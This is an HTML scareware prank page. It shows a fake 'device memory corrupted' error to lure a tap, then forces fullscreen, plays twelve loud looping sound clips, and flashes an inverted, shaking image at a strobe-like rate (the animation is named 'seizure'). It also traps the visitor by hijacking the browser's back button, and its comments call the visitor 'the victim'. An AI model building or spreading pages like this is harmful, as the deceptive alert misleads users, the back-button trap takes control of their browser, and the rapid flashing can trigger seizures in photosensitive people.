<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>⚠️ SYSTEM FAILURE ⚠️</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
        
        /* صورة المرأة: رعشة هستيرية مع قلب الألوان سواسوة */
        #stalkerEntity { 
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
            object-fit: cover; z-index: 1; display: none;
            filter: contrast(400%) brightness(20%);
            animation: seizure 0.02s infinite; 
        }

        @keyframes seizure {
            0% { transform: translate(5px, 5px); filter: invert(0); }
            50% { transform: translate(-5px, -8px); filter: invert(0.3) hue-rotate(180deg); }
            100% { transform: translate(3px, 5px); }
        }

        #errorBox { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 100; color: #f00; text-align: center; font-family: monospace; background: rgba(0,0,0,0.9); padding: 30px; border: 3px solid #f00; box-shadow: 0 0 20px #f00; }
        .blink { animation: b 0.1s infinite; }
        @keyframes b { 50% { opacity: 0; } }
        .btn-red { background: #f00; color: #000; border: none; padding: 20px; font-weight: bold; width: 100%; cursor: pointer; font-size: 1.3em; margin-top: 20px; }
    </style>
</head>
<body onclick="launchChaos()">

    <div id="errorBox">
        <h1 class="blink">☠️ SYSTEM OVERLOAD ☠️</h1>
        <p>CRITICAL ERROR: Device memory corrupted.<br>Tap to initiate emergency repair.</p>
        <button class="btn-red">REPAIR NOW</button>
    </div>

    <img id="stalkerEntity" src="https://i.ibb.co/39snnynW/1000016067.jpg">

    <div id="audioLayer">
        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/nikomok.mp3"></audio>
        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/twahwih.mp3"></audio>
        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/sukuna-gugu-gaga-loudest.mp3"></audio>
        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/emotional-damage-99808.mp3"></audio>
        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/khrj-khrj.mp3"></audio>
        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/m-e-o-w.mp3"></audio>
        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/ringtone-nokia-destiny.mp3"></audio>
        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/hoova-2.mp3"></audio>
        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/anime-ahh.mp3"></audio>
        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/yamate-kudesai.mp3"></audio>
        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/aaaaaaaaaaaaaaaaaaaa-e-lutador.mp3"></audio>
        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/ive-got-this-faaaaaaaaahhhhh.mp3"></audio>
    </div>

    <script>
        function launchChaos() {
            // تشغيل الـ 12 صوت في رحبة سواسوة
            document.querySelectorAll('.h').forEach(a => {
                a.volume = 1.0;
                a.play();
                a.addEventListener('ended', function() { this.currentTime = 0; this.play(); }, false);
            });

            document.getElementById('errorBox').style.display = 'none';
            document.getElementById('stalkerEntity').style.display = 'block';
            
            // طلب الشاشة الكاملة سواسوة
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen();
            }

            // محاكاة اللاق البصري سواسوة (إيهام الضحية بالتعليق)
            setInterval(() => {
                console.log("Simulating CPU Stress...");
                history.pushState(null, null, window.location.href);
            }, 100);
        }
        window.onpopstate = () => history.go(1);
    </script>
</body>
</html>
